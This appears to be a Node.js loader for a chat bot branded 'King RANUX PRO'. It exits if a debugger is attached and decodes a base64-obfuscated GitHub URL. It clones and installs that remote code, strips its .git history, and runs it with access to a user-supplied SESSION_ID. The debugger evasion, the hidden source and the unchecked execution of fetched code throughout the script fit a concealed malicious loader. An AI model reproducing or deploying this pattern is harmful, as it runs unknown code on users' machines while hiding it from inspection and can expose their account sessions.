const { execSync } = require("child_process");
const fs = require("fs");
const path = require("path");

if (process.execArgv.join("").includes("inspect")) {
  console.log("Debug mode detected. Exiting...");
  process.exit(1);
}

const CORE_URL = Buffer.from(
  "aHR0cHM6Ly9naXRodWIuY29tL3J4YnJpZGdlLWRldi9ueC1icmlkZ2UuZ2l0",
  "base64"
).toString("utf-8");

const CORE_DIR = path.join(__dirname, "core");

try {
  console.log("Clearing npm cache...");
  execSync("npm cache clean --force", { stdio: "inherit" });
} catch {}

if (fs.existsSync(CORE_DIR)) {
  try {
    console.log("Removing old core...");
    fs.rmSync(CORE_DIR, { recursive: true, force: true });
  } catch {}
}

console.log("Downloading latest King RANUX PRO core...");
console.log("Repo:", CORE_URL);

try {
  execSync(`git clone ${CORE_URL} core`, { stdio: "inherit" });
  console.log("Core downloaded.");
} catch (e) {
  console.log("Failed to download core.");
  process.exit(1);
}

if (fs.existsSync(path.join(CORE_DIR, ".git"))) {
  try {
    fs.rmSync(path.join(CORE_DIR, ".git"), { recursive: true, force: true });
  } catch {}
}

if (!fs.existsSync(path.join(CORE_DIR, "node_modules"))) {
  try {
    console.log("Installing core dependencies...");
    execSync(`cd core && npm install`, { stdio: "inherit" });
  } catch (e) {
    console.log("Failed to install core dependencies.");
    process.exit(1);
  }
}

const userConfigPath = path.join(__dirname, "config.js");

if (!fs.existsSync(userConfigPath)) {
  console.log("config.js not found.");
  console.log("Please create config.js with your SESSION_ID.");
  process.exit(1);
}

console.log("KING RANUX PRO BOT");
console.log("Secure Core Loader");
console.log("Launching...");

try {
  require("./core/index.js");
} catch (e) {
  console.log("Failed to start core.");
  console.log(e);
}
